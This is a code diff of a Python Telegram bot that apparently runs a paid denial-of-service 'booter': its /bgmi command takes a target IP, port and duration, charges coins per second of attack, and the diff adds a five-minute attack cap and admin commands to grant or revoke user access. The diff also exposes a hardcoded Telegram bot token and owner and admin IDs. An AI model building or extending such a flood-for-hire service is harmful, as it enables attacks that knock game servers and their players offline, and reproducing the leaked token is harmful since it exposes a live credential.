@@ -3,15 +3,31 @@ import os
 import json
 import subprocess
 
-TOKEN = "7178304372:AAG-wAx1h3y6SH-XXfBrlUkXD_vMEJjbMjk"  # Replace this with your new bot token from BotFather
+# Load token securely from an environment variable
+TOKEN = os.getenv("7178304372:AAG-wAx1h3y6SH-XXfBrlUkXD_vMEJjbMjk")  
+OWNER_ID = "1383324178"  # Replace with your owner ID
+admin_ids = {"6060545769", "1871909759"}  # List of Admins
 
-bot = telebot.TeleBot(TOKEN)
-
-OWNER_ID = "1383324178"  # Change this to your owner ID
-admin_ids = {"6060545769", "1871909759"}  # Admins list
 USER_FILE = "users.txt"
 COINS_FILE = "coins.json"
 COIN_RATE = 10  # 1 sec = 10 coins
+MAX_ATTACK_TIME = 300  # Max attack time is 5 minutes (300 sec)
+
+bot = telebot.TeleBot(TOKEN)
+
+# Load authorized users
+def load_users():
+    if os.path.exists(USER_FILE):
+        with open(USER_FILE, "r") as file:
+            return set(file.read().splitlines())
+    return set()
+
+allowed_users = load_users()
+
+# Save authorized users
+def save_users():
+    with open(USER_FILE, "w") as file:
+        file.write("\n".join(allowed_users))
 
 # Load user coins
 def load_coins():
@@ -27,74 +43,50 @@ def save_coins():
     with open(COINS_FILE, "w") as file:
         json.dump(user_coins, file, indent=4)
 
-# Load authorized users
-def load_users():
-    if os.path.exists(USER_FILE):
-        with open(USER_FILE, "r") as file:
-            return set(file.read().splitlines())
-    return set()
+# Welcome Message on /start
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, f"👋 Welcome {message.chat.first_name}! Use /help to see available commands.")
 
-allowed_users = load_users()
-
-# Owner Promotes Admin
-@bot.message_handler(commands=['promote'])
-def promote_admin(message):
-    user_id = str(message.chat.id)
-    if user_id == OWNER_ID:
-        command = message.text.split()
-        if len(command) > 1:
-            new_admin = command[1]
-            if new_admin not in admin_ids:
-                admin_ids.add(new_admin)
-                bot.reply_to(message, f"✅ User {new_admin} promoted to Admin.")
-            else:
-                bot.reply_to(message, "❌ User is already an Admin.")
-        else:
-            bot.reply_to(message, "Usage: /promote <user_id>")
-    else:
-        bot.reply_to(message, "🚫 Only the Owner can use this command.")
-
-# Owner Demotes Admin
-@bot.message_handler(commands=['demote'])
-def demote_admin(message):
-    user_id = str(message.chat.id)
-    if user_id == OWNER_ID:
-        command = message.text.split()
-        if len(command) > 1:
-            admin_to_remove = command[1]
-            if admin_to_remove in admin_ids:
-                admin_ids.remove(admin_to_remove)
-                bot.reply_to(message, f"✅ Admin {admin_to_remove} has been demoted.")
-            else:
-                bot.reply_to(message, "❌ User is not an Admin.")
-        else:
-            bot.reply_to(message, "Usage: /demote <user_id>")
-    else:
-        bot.reply_to(message, "🚫 Only the Owner can use this command.")
-
-# Admin Adds Coins to User
-@bot.message_handler(commands=['addcoins'])
-def add_coins(message):
+# Grant user access
+@bot.message_handler(commands=['access'])
+def grant_access(message):
     user_id = str(message.chat.id)
     if user_id in admin_ids or user_id == OWNER_ID:
         command = message.text.split()
-        if len(command) > 2:
-            target_user = command[1]
-            try:
-                amount = int(command[2])
-                if amount <= 0:
-                    raise ValueError
-                user_coins[target_user] = user_coins.get(target_user, 0) + amount
-                save_coins()
-                bot.reply_to(message, f"✅ Added {amount} coins to user {target_user}.")
-            except ValueError:
-                bot.reply_to(message, "❌ Invalid amount. Enter a positive number.")
+        if len(command) > 1:
+            new_user = command[1]
+            if new_user not in allowed_users:
+                allowed_users.add(new_user)
+                save_users()
+                bot.reply_to(message, f"✅ User {new_user} has been granted access.")
+            else:
+                bot.reply_to(message, "❌ User already has access.")
         else:
-            bot.reply_to(message, "Usage: /addcoins <user_id> <amount>")
+            bot.reply_to(message, "Usage: /access <user_id>")
     else:
         bot.reply_to(message, "🚫 Only Admins can use this command.")
 
-# /bgmi Attack Command with Coin Deduction & Execution
+# Revoke user access
+@bot.message_handler(commands=['deaccess'])
+def revoke_access(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_ids or user_id == OWNER_ID:
+        command = message.text.split()
+        if len(command) > 1:
+            target_user = command[1]
+            if target_user in allowed_users:
+                allowed_users.remove(target_user)
+                save_users()
+                bot.reply_to(message, f"✅ User {target_user} has been removed from the access list.")
+            else:
+                bot.reply_to(message, "❌ User is not in the access list.")
+        else:
+            bot.reply_to(message, "Usage: /deaccess <user_id>")
+    else:
+        bot.reply_to(message, "🚫 Only Admins can use this command.")
+
+# /bgmi Attack Command with Coin Deduction & Time Limit
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
@@ -104,6 +96,10 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])
             time = int(command[3])  # Time in seconds
+
+            if time > MAX_ATTACK_TIME:
+                bot.reply_to(message, f"⏳ Max attack time is {MAX_ATTACK_TIME} seconds!")
+                return
 
             required_coins = time * COIN_RATE  # Calculate required coins
             balance = user_coins.get(user_id, 0)
